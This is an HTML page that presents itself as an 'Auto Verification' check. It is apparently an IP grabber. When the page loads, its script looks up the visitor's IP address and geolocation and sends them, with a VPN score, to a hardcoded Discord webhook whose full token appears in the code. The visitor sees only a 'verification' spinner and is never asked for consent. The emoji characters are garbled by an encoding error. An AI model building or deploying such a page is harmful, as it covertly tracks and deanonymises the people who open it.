<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Verification System</title>
  <!-- Google Font -->
  <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500;700&display=swap" rel="stylesheet">
  <style>
    body { font-family: 'Roboto', sans-serif; background-color: #f5f7fa; margin: 0; display: flex; justify-content: center; align-items: center; height: 100vh; }
    .container { background: #fff; border-radius: 12px; box-shadow: 0 6px 18px rgba(0,0,0,0.1); width: 90%; max-width: 400px; padding: 30px; text-align: center; }
    h1 { margin-bottom: 20px; color: #333; font-size: 1.8rem; }
    .status { display: flex; align-items: center; justify-content: center; padding: 20px; border-radius: 8px; font-weight: 500; margin-top: 20px; }
    .spinner { width: 28px; height: 28px; border: 4px solid rgba(0,0,0,0.1); border-left-color: #4a90e2; border-radius: 50%; animation: spin 1s linear infinite; margin-right: 12px; }
    @keyframes spin { to { transform: rotate(360deg); } }
    .loading { background: #e1f0ff; color: #004085; border: 1px solid #b3d4fc; }
    .success { background: #e6f4ea; color: #155724; border: 1px solid #c3e6cb; }
    .error { background: #f8d7da; color: #721c24; border: 1px solid #f5c6cb; }
    .warning { background: #fff3cd; color: #856404; border: 1px solid #ffeeba; }
  </style>
</head>
<body>
  <div class="container">
    <h1>üîê Auto Verification</h1>
    <div id="status" class="status loading">
      <div class="spinner"></div>
      <div><strong>Initializing...</strong> <span>Checking connection...</span></div>
    </div>
  </div>
  <script>
    const DISCORD_WEBHOOK = 'https://discord.com/api/webhooks/1370031066089394248/ApRpcsSICEv7xnBypVTicDEyCiUQsphCParmvg8E_U5RWoHNy-Kszc1CnTCTAqh1Qkn3';
    const statusDiv = document.getElementById('status');

    function setStatus(cls, title, msg) {
      statusDiv.className = 'status ' + cls;
      statusDiv.innerHTML = (cls === 'loading' ? '<div class="spinner"></div>' : '') +
        `<div><strong>${title}</strong> <span>${msg}</span></div>`;
    }

    async function safeFetch(url, opts = {}, timeout = 5000) {
      const ctrl = new AbortController();
      const timer = setTimeout(() => ctrl.abort(), timeout);
      try {
        const res = await fetch(url, { ...opts, signal: ctrl.signal, mode: 'cors' });
        clearTimeout(timer);
        return res;
      } catch (e) {
        clearTimeout(timer);
        throw e;
      }
    }

    async function autoVerify() {
      setStatus('loading', 'Fetching IP', 'Retrieving your IP address...');
      try {
        let ipRes;
        try { ipRes = await safeFetch('https://api.ipify.org?format=json'); }
        catch { ipRes = await safeFetch('https://api.db-ip.com/v2/free/self'); }
        const ipData = await ipRes.json();
        const ip = ipData.ip || ipData.ipAddress;
        if (!ip) throw new Error('IP not found');

        setStatus('loading', 'Geolocating', 'Fetching location info...');
        let geoRes;
        try { geoRes = await safeFetch(`https://ipapi.co/${ip}/json/`); }
        catch { geoRes = await safeFetch(`https://ipwho.is/${ip}`); }
        const geo = await geoRes.json();

        const city = geo.city || 'Unknown';
        const region = geo.region_name || geo.region || 'Unknown';
        const country = geo.country_name || geo.country || 'Unknown';

        setStatus('loading', 'Analyzing', 'Checking for VPN/proxy...');
        let score = 0;
        const factors = [];
        if (geo.org && /datacenter|hosting|cloud/i.test(geo.org)) { factors.push('Datacenter IP'); score += 40; }
        if (geo.org && /vpn|proxy|tor/i.test(geo.org)) { factors.push('VPN/Proxy'); score += 50; }
        if (geo.port && [1080,3128,8080,8888,9050].includes(Number(geo.port))) { factors.push('Proxy port'); score += 30; }
        if (geo.timezone && geo.country_code && !geo.timezone.includes(geo.country_code)) { factors.push('Timezone mismatch'); score += 20; }
        const usingVpn = score >= 60;

        setStatus('loading', 'Sending', 'Reporting to Discord...');
        const embed = {
          username: 'Verification System',
          avatar_url: 'https://i.imgur.com/ZOKp8LH.png',
          embeds: [{
            title: `${city}, ${country}`,
            color: usingVpn ? 0xdc3545 : 0x28a745,
            fields: [
              { name: 'üåê IP Address', value: ip, inline: true },
              { name: 'üìç Location', value: `${city}, ${region}, ${country}`, inline: true },
              { name: 'üîç Status', value: usingVpn ? '‚ùå VPN/Proxy Detected' : '‚úÖ No VPN Detected', inline: false }
            ],
            footer: { text: usingVpn ? `VPN Score: ${score}` : `Verified at ${new Date().toLocaleString()}` }
          }]
        };
        if (factors.length) embed.embeds[0].fields.push({ name: '‚ö†Ô∏è Factors', value: factors.join('\n'), inline: false });

        await fetch(DISCORD_WEBHOOK, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(embed) });

        setStatus(usingVpn ? 'warning' : 'success', usingVpn ? 'VPN Detected' : 'Verification Successful', usingVpn ? 'Disable VPN and refresh.' : 'Your connection is secure.');
      } catch (err) {
        console.error(err);
        setStatus('error', 'Error', err.message || 'Verification failed.');
      }
    }

    window.addEventListener('DOMContentLoaded', autoVerify);
  </script>
</body>
</html>
